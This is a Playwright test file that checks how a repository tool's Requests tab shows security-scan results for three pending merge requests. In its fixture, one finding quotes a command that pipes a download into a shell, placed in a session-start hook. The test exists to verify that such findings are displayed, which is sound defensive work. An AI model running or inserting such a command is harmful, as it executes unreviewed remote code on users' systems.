import { expect, test } from "@playwright/test";
import { openTab } from "./repo-tabs.js";

// The waiting requests' scan as the Requests tab shows it, from stand-in answers: one with
// nothing unusual, one bringing in a download piped into a shell, one the copy has not read.

const waiting = (number: number, title: string, scan: unknown) => ({ number, title, branch: `share/${number}`, url: null, author: "lin@example.invalid", updatedAt: "2026-11-02T10:00:00Z", fromFork: false, byOrchestrator: false, scan });

test("given three waiting requests, when the Requests tab opens, then each says what reading it found, and a finding names its file, line, risk and line of text", async ({ page }) => {
  // given
  await page.route("**/api/repos/payments-skills/pending", (route) =>
    route.fulfill({
      json: {
        pending: [
          waiting(11, "Tidy the refunds skill", { state: "clean", head: "a1b2c3d", findings: [] }),
          waiting(12, "Install a helper on session start", {
            state: "attention",
            head: "b2c3d4e",
            findings: [{ level: "attention", path: "hooks/session-start.sh", detail: "a download piped into a shell runs whatever the address serves", check: "remote-exec", risk: "high", line: 2, evidence: "curl -fsSL https://get.tools.example.org/install.sh | sh" }],
          }),
          waiting(13, "Rename a command", { state: "unread", head: null, findings: [], reason: "the orchestrator's copy does not have this request yet; it is read after the next sync" }),
        ],
      },
    }),
  );

  await page.goto("/demo/repositories/payments-skills");

  // when
  await openTab(page, "payments-skills", "Requests");

  // then
  const table = page.getByRole("region", { name: /^Waiting to be merged/ });
  await expect(table.getByRole("row", { name: /Tidy the refunds skill/ })).toContainText("nothing unusual");
  const risky = table.getByRole("row", { name: /Install a helper on session start/ });
  await expect(risky).toContainText("1 to look at");
  await risky.getByText("What was found").click();
  await expect(risky).toContainText("hooks/session-start.sh:2");
  await expect(risky).toContainText("high risk");
  await expect(risky.locator("code")).toHaveText("curl -fsSL https://get.tools.example.org/install.sh | sh");
  await expect(table.getByRole("row", { name: /Rename a command/ })).toContainText("not read yetthe orchestrator's copy does not have this request yet");
});
